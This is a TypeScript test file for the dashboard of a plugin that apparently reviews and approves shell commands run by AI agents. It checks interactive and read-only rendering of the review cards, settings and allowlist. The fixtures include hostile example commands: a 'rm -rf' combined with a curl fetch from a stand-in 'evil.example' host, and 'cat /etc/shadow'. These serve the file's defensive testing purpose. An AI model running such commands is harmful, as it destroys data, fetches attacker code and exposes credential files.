import assert from "node:assert/strict";
import { describe, it } from "node:test";

import {
  CONFIGURE_CLI,
  LOG_PURGE,
  LOG_WIPE,
  VERIFY_CLI,
  allowlistRm,
  approveOnce,
} from "./dashboardSlashHints.ts";
import {
  renderAllowlist,
  renderReviewsPanel,
  renderSettings,
  renderTimeline,
  type DashboardViewState,
} from "./dashboardPanels.ts";

const now = Date.parse("2026-09-08T12:00:00.000Z");

const state: DashboardViewState = {
  pending: [
    {
      eventId: "e1",
      toolCallId: "call-1",
      approvalId: "plugin:1",
      tool: "exec",
      command: "rm -rf /tmp/x && curl https://evil.example/drop",
      args: { command: "rm -rf /tmp/x && curl https://evil.example/drop" },
      scan: {
        decision: "review",
        review_severity: "warning",
        summary: "High-risk shell",
        matched_rules: ["AIRA-010"],
        risk: 0.8,
      },
      sessionKey: "main",
      sessionId: "uuid-1",
      timeoutMs: 600_000,
      createdAtMs: now - 5000,
      intent: "cleanup",
      intentKind: "user",
      priorSteps: [{ tool: "read", command: "cat notes", ok: true }],
    },
  ],
  history: [
    {
      id: "ol-1",
      ts: "2026-09-08T11:59:00.000Z",
      event: "scan",
      decision: "review",
      tool: "exec",
      command: "rm -rf /tmp/x",
      summary: "destructive",
      reviewSeverity: "warning",
      sessionKey: "main",
      sessionId: "uuid-1",
      intent: null,
      intentKind: null,
      unattended: false,
      runId: "run-1",
      neighbors: [],
    },
  ],
  audit: { scanned: 1, allow: 0, review: 1, block: 0, error: 0 },
  sessions: [
    {
      sessionId: "uuid-1",
      sessionKey: "main",
      allowAll: false,
      quietUntilMs: null,
      pending: 1,
    },
  ],
  sensitivity: "strict",
  unattendedSensitivity: "strict",
  allowAll: false,
  quietUntilMs: null,
  feedbackMode: "submit",
  onScanError: "review",
  log: {
    enabled: true,
    path: "/tmp/log",
    bytes: 10,
    lines: 1,
    maxAgeDays: 14,
    maxBytes: 32 * 1024 * 1024,
  },
  allowlist: [{ index: 1, kind: "skeleton", tool: "exec", label: "git status" }],
  resolveAvailable: true,
  setupNeeded: false,
};

describe("dashboardPanels interactive vs read-only", () => {
  it("write mode keeps mutation hooks and hides slash substitutes", () => {
    const reviews = renderReviewsPanel(state, { now, interactive: true });
    assert.match(reviews, /data-act="allow-once"/);
    assert.match(reviews, /data-act="allow-always"/);
    assert.match(reviews, /data-act="deny"/);
    assert.match(reviews, /\/approve plugin:1 allow-once/);
    assert.match(reviews, /\/approve plugin:1 allow-always/);
    assert.match(reviews, /\/approve plugin:1 deny/);
    assert.doesNotMatch(reviews, /plugin:…/);
    assert.doesNotMatch(reviews, /AIRA-010/);

    const settings = renderSettings(state, { now, interactive: true });
    assert.match(settings, /data-allow-mode="on"/);
    assert.match(settings, /soft and hard/);
    assert.match(settings, /Does not override a <strong>block<\/strong>/);
    assert.match(settings, /stored on this host so every plugin isolate sees them/);
    assert.match(settings, /data-quiet-global="8h"/);
    assert.match(settings, /data-sens="warning"/);
    assert.match(settings, /data-sens-scope="unattended"/);
    assert.match(settings, /data-feedback="off"/);
    assert.match(settings, /data-scan-error="allow"/);
    assert.match(settings, /data-log="save"/);
    assert.match(settings, /data-verify="1"/);
    assert.match(settings, /data-session-sens="attended"/);
    assert.match(settings, /data-session-sens="unattended"/);
    assert.doesNotMatch(settings, /data-policy="allow-all"/);
    assert.doesNotMatch(settings, /<ul class="slash-cmds"/);

    const allow = renderAllowlist(state, { now, interactive: true });
    assert.match(allow, /data-allow-rm="1"/);
  });

  it("write mode still shows allow/deny when the plugin: id is not joined yet", () => {
    const pending = { ...state.pending[0]!, approvalId: undefined };
    const reviews = renderReviewsPanel(
      { ...state, pending: [pending], resolveAvailable: false },
      { now, interactive: true },
    );
    assert.match(reviews, /data-act="allow-once"/);
    assert.match(reviews, /data-act="deny"/);
    const onceAt = reviews.indexOf('data-act="allow-once"');
    const spineAt = reviews.indexOf("spine-now");
    assert.ok(onceAt >= 0 && spineAt > onceAt, "decide before the command spine");
    assert.doesNotMatch(reviews, /plugin:…/);
    assert.match(reviews, /\/sentrook pending e1/);
    assert.match(reviews, /no copyable/);
  });

  it("read-only mode substitutes every former button with the matching command", () => {
    const reviews = renderReviewsPanel(state, { now, interactive: false });
    assert.doesNotMatch(reviews, /data-act=/);
    assert.match(reviews, new RegExp(approveOnce("plugin:1").replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
    assert.match(reviews, /\/approve plugin:1 allow-always/);
    assert.match(reviews, /\/approve plugin:1 deny/);
    assert.doesNotMatch(reviews, /plugin:…/);

    const missing = renderReviewsPanel(
      { ...state, pending: [{ ...state.pending[0]!, approvalId: undefined }] },
      { now, interactive: false },
    );
    assert.doesNotMatch(missing, /plugin:…/);
    assert.match(missing, /\/sentrook pending e1/);
    assert.match(missing, /No copyable/);

    const settings = renderSettings(state, { now, interactive: false });
    for (const needle of [
      "/sentrook allow-all all off",
      "/sentrook allow-all all on",
      "/sentrook quiet all off",
      "/sentrook quiet all 30m",
      "/sentrook quiet all 2h",
      "/sentrook quiet all 8h",
      "/sentrook sensitivity session main attended warning",
      "/sentrook quiet session main 30m",
      "/sentrook sensitivity attended strict",
      "/sentrook sensitivity unattended critical confirm",
      "/sentrook feedback submit",
      "/sentrook scan-error allow confirm",
      "/sentrook log retention 14d",
      "/sentrook log retention 32MiB",
      LOG_PURGE,
      LOG_WIPE,
      VERIFY_CLI,
    ]) {
      assert.match(settings, new RegExp(needle.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), needle);
    }
    assert.doesNotMatch(settings, /data-allow-mode=/);
    assert.doesNotMatch(settings, /data-sens=/);
    assert.doesNotMatch(settings, /data-verify=/);

    const allow = renderAllowlist(state, { now, interactive: false });
    assert.doesNotMatch(allow, /data-allow-rm=/);
    assert.match(allow, new RegExp(allowlistRm(1).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  });

  it("timeline filters stay in both modes and first-run setup stays credential-free when read-only", () => {
    const tl = renderTimeline(state, { now, interactive: false });
    assert.match(tl, /data-tl-search/);
    assert.match(tl, /data-tl-decision="review"/);
    assert.match(tl, /data-tl-view="session"/);
    assert.match(tl, /data-tl-item/);

    const setup = renderReviewsPanel({ ...state, pending: [], setupNeeded: true }, { now, interactive: false });
    assert.match(setup, new RegExp(CONFIGURE_CLI.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
    assert.doesNotMatch(setup, /data-setup-save/);
    assert.doesNotMatch(setup, /data-setup-client-secret/);
  });

  it("empty queue is All clear; two cards get a critical-first jump list", () => {
    const empty = renderReviewsPanel({ ...state, pending: [] }, { now, interactive: true });
    assert.match(empty, /All clear/);
    assert.doesNotMatch(empty, /class="jump"/);

    const second = {
      ...state.pending[0]!,
      eventId: "e0",
      toolCallId: "call-0",
      approvalId: "plugin:0",
      command: "cat /etc/shadow",
      scan: { ...state.pending[0]!.scan, review_severity: "critical" as const, summary: "credential file" },
      createdAtMs: now - 1000,
    };
    const reviews = renderReviewsPanel({ ...state, pending: [...state.pending, second] }, { now, interactive: true });
    const jump = reviews.match(/<ol class="jump">([\s\S]*?)<\/ol>/)?.[1] ?? "";
    assert.match(jump, /class="tag sev-critical"/);
    assert.ok(jump.indexOf("sev-critical") < jump.indexOf("sev-warning"));
    assert.match(reviews, /#e0/);
    assert.match(reviews, /#e1/);
    assert.match(reviews, /2 waiting/);
  });

  it("shows OpenClaw session names and a quiet-active banner", () => {
    const labeled = renderSettings(
      {
        ...state,
        quietUntilMs: now + 30 * 60_000,
        sessions: [
          {
            sessionId: "cebf-1",
            sessionKey: "agent:main:dashboard:cebf-1",
            allowAll: false,
            quietUntilMs: null,
            pending: 0,
            label: "Control UI",
          },
        ],
      },
      { now, interactive: true },
    );
    assert.match(labeled, /class="sess-name">Control UI</);
    assert.match(labeled, /agent:main:dashboard:cebf-1/);
    assert.doesNotMatch(labeled, /class="sess-key">Control UI</);
    assert.match(labeled, /class="quiet-status"/);
    assert.match(labeled, /Quiet mode active, time remaining:/);
    assert.match(labeled, /class="floor-hint floor-warning"/);
    assert.match(labeled, /data-allow-mode="on" class="set-warn"/);
  });
});
